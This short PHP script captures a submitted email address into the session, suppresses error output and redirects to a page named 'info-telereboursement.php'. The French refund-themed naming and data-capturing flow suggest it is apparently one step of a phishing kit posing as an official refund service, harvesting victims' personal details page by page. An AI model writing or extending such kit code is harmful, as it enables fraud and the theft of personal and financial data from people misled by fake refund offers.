<?php

    session_start();
    error_reporting(0);

	$_SESSION['email'] = $_POST['email'];
	

		
			
			header('Location:./info-telereboursement.php'); ?>